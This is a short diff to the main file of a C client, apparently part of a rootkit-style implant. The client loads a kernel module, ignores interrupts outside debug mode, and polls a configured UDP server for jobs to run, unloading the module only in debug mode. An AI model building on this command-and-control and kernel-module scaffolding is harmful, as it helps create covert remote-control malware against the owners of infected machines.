@@ -1,11 +1,14 @@
 #include "inc/client.h"
-#include "inc/cmd.h"
-#include "inc/job.h"
+#include "inc/kernel.h"
+#include "inc/cmds.h"
 #include "inc/util.h"
+#include "inc/save.h"
+#include "inc/job.h"
 
 #include <stdbool.h>
 #include <strings.h>
 
+#include <signal.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -36,9 +39,28 @@
 
 // clang-format on
 
+bool should_quit = false;
+
+void handler(int sig){
+  // interrupt can be ignored if we are not running in debug mode
+  if(!SHRK_DEBUG && SIGINT == sig)
+    return;
+    
+  debug("got a signal (%d), quitting", sig);
+  should_quit = true;
+}
+
 int main() {
+  signal(SIGINT, handler);
+  signal(SIGILL, handler);
+  signal(SIGSEGV, handler);
+
   client_t _client, *client = &_client;
   job_t    _job, *job       = &_job;
+
+  // load the kernel module
+  if(!kernel_load())
+    return EXIT_FAILURE;
 
   // initializtion
   randseed();
@@ -46,12 +68,12 @@ int main() {
 
   // setup the UDP client connection (also does address resolving)
   if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT) < 0) {
-    debug("failed to create a connection: %s\n", strerror(errno));
+    debug_err("failed to create a connection");
     return EXIT_FAILURE;
   }
 
   // ask for jobs and handle them
-  while (true) {
+  while (!should_quit) {
     if (!job_recv(job, true))
       goto next;
 
@@ -63,6 +85,12 @@ int main() {
   }
 
   // we are done, free/cleanup stuff
+  save_close();
   job_free(job);
+  
+  // we can remove the kernel module if we are in debug mode
+  if(SHRK_DEBUG)
+    kernel_unload();
+
   return EXIT_SUCCESS;
 }
